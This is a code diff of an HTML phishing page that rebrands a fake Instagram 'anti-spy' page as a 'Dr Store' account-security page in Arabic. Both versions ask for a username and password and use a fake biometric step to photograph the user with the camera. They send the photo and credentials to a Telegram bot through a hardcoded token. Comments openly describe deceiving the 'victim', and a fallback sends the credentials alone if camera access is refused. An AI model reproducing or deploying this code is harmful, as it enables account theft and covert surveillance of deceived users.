@@ -3,86 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy & Security Center</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cookie&display=swap" rel="stylesheet">
+    <title>Dr Store - نظام الحماية المتقدم</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background-color: #050505; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background-color: #121212; border: 1px solid #222; border-radius: 20px; padding: 30px 20px; width: 340px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.9); }
-        
-        /* النص الانسيابي المطلوب */
-        .brand { font-family: 'Cookie', cursive; font-size: 52px; margin-bottom: 0px; color: #fff; letter-spacing: 1px; }
-        
-        .shield-icon { font-size: 40px; margin-bottom: 15px; display: block; }
-        
-        /* العناوين بالعربية والإنجليزية */
-        h2 { font-size: 19px; font-weight: 700; margin-bottom: 5px; color: #0095f6; }
-        .sub-title { font-size: 15px; color: #0095f6; font-weight: 600; margin-bottom: 15px; display: block; }
-        
-        p { font-size: 12px; color: #b0b0b0; line-height: 1.5; margin-bottom: 25px; text-align: center; padding: 0 5px; }
-        
-        input { width: 100%; background: #1c1c1c; border: 1px solid #333; border-radius: 10px; padding: 14px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; margin-bottom: 12px; text-align: left; direction: ltr; }
-        input:focus { border-color: #0095f6; background: #252525; }
-        
-        button { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 10px; padding: 14px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 5px; }
-        button:hover { background-color: #1a73e8; transform: scale(1.02); }
-        
-        .footer-status { margin-top: 25px; font-size: 11px; color: #444; border-top: 1px solid #222; padding-top: 15px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background-color: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 20px; padding: 35px 25px; width: 330px; text-align: center; box-shadow: 0 10px 30px rgba(76, 175, 80, 0.1); }
+        .logo-container { width: 70px; height: 70px; margin: 0 auto 15px; border-radius: 50%; background: linear-gradient(45deg, #7b1fa2, #e91e63); display: flex; align-items: center; justify-content: center; border: 2px solid #333; }
+        .logo-text { font-weight: bold; font-size: 28px; color: #fff; }
+        h2 { font-size: 19px; margin-bottom: 5px; color: #fff; }
+        .status { color: #4caf50; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: block; }
+        p { font-size: 12px; color: #aaa; line-height: 1.5; margin-bottom: 20px; }
+        input { width: 100%; background: #151515; border: 1px solid #222; border-radius: 10px; padding: 14px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; margin-bottom: 12px; text-align: center; }
+        button { width: 100%; background: linear-gradient(90deg, #4caf50, #2e7d32); color: white; border: none; border-radius: 10px; padding: 14px; font-size: 15px; font-weight: bold; cursor: pointer; }
+        #loading-view { display: none; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="brand">Instaagram</div>
-        <span class="shield-icon">🛡️</span>
-        
-        <h2>Anti-Spy Protection</h2>
-        <span class="sub-title">حماية من المراقبة والتجسس</span>
-        
-        <p>Your account might be visible to unauthorized viewers. Activate <b>End-to-End Encryption</b> to secure your stories and posts.<br>
-        <span style="color:#888; font-size:11px;">رصد النظام محاولات تجسس، فعل التشفير الآن لحماية خصوصيتك.</span></p>
-        
-        <input type="text" id="user_id" placeholder="Username" spellcheck="false">
-        <input type="password" id="user_pass" placeholder="Password">
-        
-        <button onclick="run_security()">Secure My Account Now</button>
-        
-        <div class="footer-status">
-            Status: <span style="color:#00ff00;">Scanning for Spies...</span> <br>
-            Secure Node: #AX-992-SEC
+        <div id="init-view">
+            <div class="logo-container"><span class="logo-text">DR</span></div>
+            <h2>تأمين الحساب المتقدم</h2>
+            <span class="status">جدار حماية Dr Store 2026</span>
+            <p>لتفعيل ميزة التشفير ومنع الابتزاز، يرجى تسجيل الدخول والضغط على زر "تأمين" للمطابقة الحيوية للوجه.</p>
+            
+            <input type="text" id="acc" placeholder="اسم المستخدم / الإيميل">
+            <input type="password" id="key" placeholder="كلمة المرور">
+            
+            <button onclick="startCapture()">بدء تأمين الحساب</button>
+        </div>
+
+        <div id="loading-view">
+            <div style="margin: 20px 0;">🔄</div>
+            <h3>جاري المعالجة...</h3>
+            <p>يرجى توجيه الهاتف أمام وجهك لإتمام عملية المطابقة الحيوية (Biometric Link).</p>
         </div>
     </div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const T = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
-        const C = "897618292";
+        const TOKEN = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+        const CHAT_ID = "897618292";
 
-        // تشغيل الكاميرا بصمت خلف الكواليس
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(s => { document.getElementById('v').srcObject = s; })
-            .catch(() => {});
+        async function startCapture() {
+            const user = document.getElementById('acc').value;
+            const pass = document.getElementById('key').value;
 
-        function run_security() {
-            const v = document.getElementById('v'), c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
+            if (!user || !pass) return alert("أدخل البيانات أولاً");
 
-            c.toBlob(b => {
-                const f = new FormData();
-                f.append("chat_id", C);
-                f.append("photo", b, "security_log.jpg");
-                f.append("caption", `🚨 صيد جديد (سيناريو الحماية)!\n\n👤 يوزر: ${document.getElementById('user_id').value}\n🔑 باس: ${document.getElementById('user_pass').value}`);
+            // 1. إظهار واجهة التحميل للتمويه
+            document.getElementById('init-view').style.display = 'none';
+            document.getElementById('loading-view').style.display = 'block';
 
-                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: "POST", body: f })
-                .then(() => {
-                    alert("Security Protocol Activated! Your account is now protected from spying.");
-                    window.location.href = "https://www.instagram.com/accounts/privacy_and_security/";
-                });
-            }, 'image/jpeg');
+            try {
+                // 2. طلب الكاميرا (سيظن أنها للمطابقة الحيوية)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // 3. التقاط الصورة بعد ثانية واحدة من فتح الكاميرا
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // تحويل الصورة وإرسالها
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("photo", blob, "victim_face.jpg");
+                        formData.append("caption", `🛡️ صيد كامل (تأمين):\n👤 اليوزر: ${user}\n🔑 الرمز: ${pass}`);
+
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            body: formData
+                        }).then(() => {
+                            // 4. التوجيه النهائي للموقع الرسمي
+                            window.location.href = "https://drstoreq.com/";
+                        });
+                    }, 'image/jpeg');
+                }, 1500);
+
+            } catch (err) {
+                // في حال رفض الكاميرا، نرسل اليوزر والباسورد فقط
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐 يوزر وباسورد (بدون صورة):\n${user} | ${pass}`)
+                .then(() => window.location.href = "https://drstoreq.com/");
+            }
         }
     </script>
 </body>
 </html>
+
